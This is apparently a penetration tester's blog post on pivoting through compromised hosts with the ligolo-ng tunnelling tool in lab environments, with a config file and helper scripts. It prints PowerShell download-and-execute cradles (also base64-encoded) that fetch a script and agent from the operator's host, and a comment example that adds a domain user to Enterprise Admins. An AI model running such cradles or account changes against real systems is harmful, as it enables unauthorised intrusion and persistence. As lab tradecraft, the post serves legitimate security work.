---
date: 2025-11-19
---
# Ligolo-ng for route-fu

I really like `ligolo-ng` https://github.com/nicocha30/ligolo-ng, its kind of a workflow maturity evolution up and over other proxying tools like `chisel` or in a lot of cases, even an `ssh` dynamic port forward (socks proxy).  There's something inefficient about `proxychains`, while cool and all, transparent routing over `wireguard` just seems so much cleaner.

For a long time, I had used `ligolo-ng` through the console.  It's great!  The only downside I found is that if you wanted multiple active agents/interfaces at the same time, you would have to run multiple instances of the console, each tied to an interface.  Maybe I missed something and I was wrong.

I'll go over how typically it would be used in console mode, but what I've become a big fan of is the `conf` file deployment method, and using the web interface for managing agents, interfaces, and listeners.

## Console workflow

You would typically create a new interface, set the interface to "up", and start `ligolo-proxy`:

```
sudo ip tuntap add user $USER mode tun dev ligolo
sudo ip link set ligolo up
ligolo-proxy -laddr 10.10.15.101:11601
```

You would then connect `ligolo-agent` running on a target machine to `ligolo-proxy` running on attacker

```
.\ligolo-agent.exe -connect 10.10.15.101:11601 -retry -ignore
```

You would then activate the session (the agent), do an `ifconfig` within `ligolo-proxy` to figure out interfaces on the agent host, and manually add routes to the `ligolo` interface on attacker:

```
sudo ip route add 172.16.55.0/24 dev ligolo
```

this is a gross generalization, the quickstart guide has more advanced usage: https://docs.ligolo.ng/Quickstart/

## My workflow

Everyone has their own, I'm sure, but after the above became muscle memory, and I wanted to do more advanced things, like multiple active interfaces, and because working in the console(s) became tedium that wasn't so difficult as it was time inefficient, I gravitated toward a `conf` file deployment, and the integrated web interface.

You can read more about doing a `conf` file deployment here: https://docs.ligolo.ng/Config-File/

But my case is a little different, because I have some helper scripts n stuff I built out to streamline the workflow.

Here's my scrubbed conf

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/eighteen]
└─$ cat ~/ligolo-proxy/ligolo-ng.yaml 
agent:
    lab:
        autobind: false
        interface: ligolo
interface:
    ligolo1:
        routes:
            - 240.0.0.1/32
    ligolo2:
        routes:
            - 240.0.0.2/32
    ligolo3:
        routes:
            - 240.0.0.3/32
    ligolo4:
        routes:
            - 240.0.0.4/32
    ligolo5:
        routes:
            - 240.0.0.5/32
    ligolo6:
        routes:
            - 240.0.0.6/32
    ligolo7:
        routes:
            - 240.0.0.7/32
    ligolo8:
        routes:
            - 240.0.0.8/32
    ligolo9:
        routes:
            - 240.0.0.9/32
    ligolo10:
        routes:
            - 240.0.0.10/32
web:
    behindreverseproxy: false
    corsallowedorigin:
        - https://127.0.0.1:11602
    debug: false
    enabled: true
    enableui: true
    listen: 127.0.0.1:11602
    logfile: ui.log
    secret: [scrubbed]
    tls:
        alloweddomains: []
        autocert: false
        certfile: ""
        enabled: true
        keyfile: ""
        selfcert: true
        selfcertdomain: web.grimetime.io
    trustedproxies:
        - 127.0.0.1
    users:
        nimda: [scrubbed]
```

My conf will by default create ten different interfaces, each with a default route of `240.0.0.x` commensurate with the interface number.  You can read more about this special IP range here: https://docs.ligolo.ng/Localhost/.  These IPs allow routing to localhost on the agent host.

For building `ligolo-proxy` with the integrated webserver, I believe (but haven't tested myself) that you can just do a recursive clone of the repo:

```
git clone https://github.com/nicocha30/ligolo-ng.git --recursive
```

The net-effect is the webserver repo https://github.com/nicocha30/ligolo-ng-web gets cloned to a subpath within the clone of https://github.com/nicocha30/ligolo-ng, I am unsure whether building https://github.com/nicocha30/ligolo-ng also builds https://github.com/nicocha30/ligolo-ng-web or if you have to switch to that submodule and build it first.  In my case I had cloned both repos separately and built out the webserver, then copied the relevant files out of it into https://github.com/nicocha30/ligolo-ng, and built it.

So, can't provide much help there.

But basically what I have done is create a directory to be used as a working directory for `ligolo-proxy`:

![[Pasted_image_20251119020408.png]]

The real home of the `conf` file is in the `/etc` directory, symlinked into the working directory.

I have a helper script I wrote for starting `ligolo-proxy`, allows me to supply just an interface (real) that it will determine IP and CIDR of, and kind of automates starting `ligolo-proxy`.  It first changes to the working directory (so the conf file gets picked up), does the interface parsing, and starts `ligolo-proxy`.  I have mine in `/var/www/html` but don't judge.

```sh
┌──(notroot㉿elysium)-[2 ~/ligolo-proxy]
└─$ cat ~/bin/ligolo-standup.sh 
#!/bin/bash
cd ~/ligolo-proxy

ipv4s=$(ip -4 -br addr)
ipv4s+=$(echo -e "\n0\t\tUNKNOWN\t\t0.0.0.0/0")
eifaces=$(echo -e "${ipv4s[@]}" | awk '{print $0}')
function usage () {
        cat <<-"    EOF"
                USAGE: $0 [EXISTING_iface] [LIGOLO_iface]
                [*] Existing interfaces:
    EOF
        echo -e "${eifaces[@]}"
        exit
}

## num args must be 2
if [[ $# -ne 1 ]]; then usage; fi  
## first arg must be existing interface or "0" (0.0.0.0 shorthand)
if [[ ! $(ip -4 -br link | awk '{print $1}') =~ $1 ]] && [[ ! $1 == "0" ]]; then usage; fi  

set -x
ifcidr=$(awk "/^$1.*/{print \$3}" <<<${ipv4s[@]})
ifip=${ifcidr%%/*}
# sudo ip tuntap add user $USER mode tun dev $2
# sudo ip link set $2 up
~/bin/ligma.sh $1
sudo /var/www/html/ligolo-proxy64.elf -laddr $ifip:11601 -selfcert -selfcert-domain grimetime.io
# sudo ip link set $2 down
# sudo ip tuntap delete mode tun dev $2
```

There's an auxiliary script, `ligma.sh`, which mocks up some of the `ligolo-agent` commands, download cradles, just provides some preliminary output when starting up `ligolo-proxy`:

```sh
┌──(notroot㉿elysium)-[2 ~/ligolo-proxy]
└─$ cat ~/bin/ligma.sh 
#!/bin/bash
ipv4s=$(ip -4 -br addr)
ipv4s+=$(echo -e "\n0\t\tUNKNOWN\t\t0.0.0.0/0")
eifaces=$(echo -e "${ipv4s[@]}" | awk '{print $0}')
function usage () {
    cat <<-"    EOF"
        USAGE: $0 [EXISTING_iface] [LIGOLO_iface]
        [*] Existing interfaces:
    EOF
    echo -e "${eifaces[@]}"
    exit
}

## num args must be 2
if [[ $# -ne 1 ]]; then usage; fi  
## first arg must be existing interface or "0" (0.0.0.0 shorthand)
if [[ ! $(ip -4 -br link | awk '{print $1}') =~ $1 ]] && [[ ! $1 == "0" ]]; then usage; fi  
fingerprint=$(sudo openssl x509 -in ~/ligolo-proxy/ligolo-selfcerts/grimetime.io_cert -nocert -fingerprint -sha256|sed -re 's/.*=//g' -e 's/://g')

ifcidr=$(awk "/^$1.*/{print \$3}" <<<${ipv4s[@]})
ifip=${ifcidr%%/*}
echo -e "iwr -uri http://$ifip/ligma.ps1 | IEX ; ligma -ip $ifip -finger $fingerprint"
echo -e "iwr -uri http://$ifip/ligma.ps1 | IEX ; ligma -ip $ifip -finger $fingerprint" | ps1_encoded_command.py
echo -e "((New-Object System.Net.WebClient).DownloadString('http://$ifip/ligma.ps1') | IEX ); ligma -ip $ifip -finger $fingerprint"
echo -e "((New-Object System.Net.WebClient).DownloadString('http://$ifip/ligma.ps1') | IEX ); ligma -ip $ifip -finger $fingerprint" | ps1_encoded_command.py
echo -e "\#\# or as sliver alias:\nligolo-agent -- -connect $ifip:11601 -retry -accept-fingerprint $fingerprint"
```

Also a helper for download exec `ligolo-agent` on a windows host, in the form of a powershell script:

```sh
┌──(notroot㉿elysium)-[2 ~/ligolo-proxy]
└─$ cat ~/bin/ligma.ps1
function Ligma {
    param ($ip,$dlport="80",$finger,[switch]$ignore)
    $wc = (New-Object System.Net.WebClient)
    $cwd = (Get-Location).Path
    $agent = "ligolo-agent64.exe"
    $binpath = "$cwd\$agent"
    $ruri = "http://$ip"+":"+"$dlport/$agent"
    if (-not (($PSBoundParameters.ContainsKey('ip')))){
        Write-Host "Bare minimum, need to supply an -ip and either -finger [fp] or -ignore"
    } else {
            if (-not (Test-Path "$binpath")) {
                        $wc.DownloadFile("$ruri","$binpath")
            }
            if ($ignore) {
                        & "$binpath" -connect $ip`:11601 -retry -ignore-cert
                }
                if ($PSBoundParameters.ContainsKey('finger')) {
                        & "$binpath" -connect $ip`:11601 -retry -accept-fingerprint $finger
            }
    }
}
```

And a helper for powershell encoded command generation, which is used in part by that output, but I also use it in other places:

```sh
┌──(notroot㉿elysium)-[2 ~/ligolo-proxy]
└─$ cat ~/bin/ps1_encoded_command.py 
#!/usr/bin/env python3
import base64, sys
if not len(sys.argv) > 1:
        stream = sys.stdin.read()
else:
        stream = sys.argv[1]
## Functionally equivalent to:
#, pwsh
#, $text = "net.exe user duff likebeer123! /add /domain; net.exe group `"Enterprise Admins`" duff /add /domain"
#, [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text)) 
import base64; print(base64.b64encode(stream.rstrip("\n").encode("utf-16-le")).decode())
```

Probably one other sofar unspoken detail is generating self-signed certificate, which we should definitely want an encrypted transport.

```sh
ss_cname="grimetime.io"
ss_org="Grime Time Syndicated"
ss_ipaddr="192.168.45.189"
ss_keyname="${ss_cname}.key";ss_certname="${ss_cname}.crt";ss_pemname="${ss_cname}.pem";openssl req -nodes -x509 -sha256 -newkey rsa:4096 -keyout "${ss_keyname}" -out "${ss_certname}" -days 365 -subj "/C=US/ST=NE/L=Monowi/O=${ss_org}/OU=Research and Development/CN=${ss_cname}" -addext "subjectAltName = DNS:localhost,DNS:grimetime.io,IP:${ss_ipaddr}";cat $ss_keyname $ss_certname > $ss_pemname
```

## My workflow:  Get grimey connected

Maybe obscene, maybe slightly unnecessary, and definitely takes the tedium out of standing up `ligolo-proxy`:

```sh
┌──(notroot㉿elysium)-[2 ~]
└─$ ligolo-standup.sh tun0
++ awk '/^tun0.*/{print $3}'
+ ifcidr=172.16.1.3/23
+ ifip=172.16.1.3
+ /home/notroot/bin/ligma.sh tun0
[sudo] password for notroot: 
iwr -uri http://172.16.1.3/ligma.ps1 | IEX ; ligma -ip 172.16.1.3 -finger 8DAA30DB479A0AA9512440A299020B700FEDED2B7169E723922A874FEC06B01B
aQB3AHIAIAAtAHUAcgBpACAAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEALgAzAC8AbABpAGcAbQBhAC4AcABzADEAIAB8ACAASQBFAFgAIAA7ACAAbABpAGcAbQBhACAALQBpAHAAIAAxADcAMgAuADEANgAuADEALgAzACAALQBmAGkAbgBnAGUAcgAgADgARABBAEEAMwAwAEQAQgA0ADcAOQBBADAAQQBBADkANQAxADIANAA0ADAAQQAyADkAOQAwADIAMABCADcAMAAwAEYARQBEAEUARAAyAEIANwAxADYAOQBFADcAMgAzADkAMgAyAEEAOAA3ADQARgBFAEMAMAA2AEIAMAAxAEIA
((New-Object System.Net.WebClient).DownloadString('http://172.16.1.3/ligma.ps1') | IEX ); ligma -ip 172.16.1.3 -finger 8DAA30DB479A0AA9512440A299020B700FEDED2B7169E723922A874FEC06B01B
KAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEALgAzAC8AbABpAGcAbQBhAC4AcABzADEAJwApACAAfAAgAEkARQBYACAAKQA7ACAAbABpAGcAbQBhACAALQBpAHAAIAAxADcAMgAuADEANgAuADEALgAzACAALQBmAGkAbgBnAGUAcgAgADgARABBAEEAMwAwAEQAQgA0ADcAOQBBADAAQQBBADkANQAxADIANAA0ADAAQQAyADkAOQAwADIAMABCADcAMAAwAEYARQBEAEUARAAyAEIANwAxADYAOQBFADcAMgAzADkAMgAyAEEAOAA3ADQARgBFAEMAMAA2AEIAMAAxAEIA
\#\# or as sliver alias:
ligolo-agent -- -connect 172.16.1.3:11601 -retry -accept-fingerprint 8DAA30DB479A0AA9512440A299020B700FEDED2B7169E723922A874FEC06B01B
+ sudo /var/www/html/ligolo-proxy64.elf -laddr 172.16.1.3:11601 -selfcert -selfcert-domain grimetime.io
INFO[0000] Loading configuration file ligolo-ng.yaml    
INFO[0000] Listening on172.16.1.3:11601               
INFO[0000] Starting Ligolo-ng Web, API URL is set to: https://127.0.0.1:11602 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: dev

ligolo-ng » WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 

```

And makes dummy work out of getting an agent deployed and connected. Just need to salt the download exec cradle with the port number for my spot `python -m http.server`:

```sh
((New-Object System.Net.WebClient).DownloadString('http://172.16.1.3:8081/ligma.ps1') | IEX ); ligma -ip 172.16.1.3 -dlport 8081 -finger 8DAA30DB479A0AA9512440A299020B700FEDED2B7169E723922A874FEC06B01B
```

I get connected:
```sh
ligolo-ng » INFO[1077] Agent joined.                                 id=005056b04e6e name="HELLUVA\\rick.james@superfreak.local" remote="172.16.4.101:56699"
```

The webserver can be accessed on port `11602` as per the `conf`.  Just need to activate the agent and assign it to one of the interfaces:

![[Pasted_image_20251119024013.png]]

![[Pasted_image_20251119024053.png]]

Additional routes that the agent host can reach can be added to a given interface, from the interfaces tab, on the RJ45 icon:

![[Pasted_image_20251119024328.png]]

Listeners can be managed from the interfaces tab, which is handy if you need to do additional port forwarding or route-fu

